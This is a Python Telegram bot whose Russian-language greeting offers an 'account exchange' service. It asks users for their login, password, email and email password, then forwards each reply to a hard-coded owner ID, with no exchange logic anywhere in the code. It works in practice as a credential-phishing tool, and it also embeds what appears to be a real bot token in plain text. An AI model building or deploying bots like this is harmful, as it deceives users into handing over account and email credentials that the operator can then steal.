import telegram
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram import Update

# Your bot token and your Telegram ID
TOKEN = "7837835834:AAHm3-hrbWlZ5tpKB2W6T16-keyolIQ-q84"
OWNER_ID = 6760627781

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    welcome_message = (
        "Привет, это бот для обмена аккаунтами! Чтобы обменяться с человеком, заполни таблицу:\n\n"
        "Логин:\n"
        "Пароль:\n"
        "Почта (если есть):\n"
        "Пароль от почты (если есть):\n"
        "Тег человека:\n"
    )
    await update.message.reply_text(welcome_message)
    # Store user state to expect their input
    context.user_data['awaiting_input'] = True

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('awaiting_input', False):
        user = update.effective_user
        message = update.message.text
        
        # Forward the message to the owner
        try:
            await context.bot.send_message(
                chat_id=OWNER_ID,
                text=f"Новое сообщение от @{user.username} (ID: {user.id}):\n\n{message}"
            )
            # Confirm to the user that their message was sent
            await update.message.reply_text("Ваше сообщение отправлено! Ожидайте ответа.")
        except telegram.error.TelegramError as e:
            await update.message.reply_text("Произошла ошибка при отправке сообщения. Попробуйте позже.")
            print(f"Error sending message: {e}")
        
        # Reset the state
        context.user_data['awaiting_input'] = False

def main():
    # Create the Application
    application = Application.builder().token(TOKEN).build()

    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # Start the bot
    print("Bot is running...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
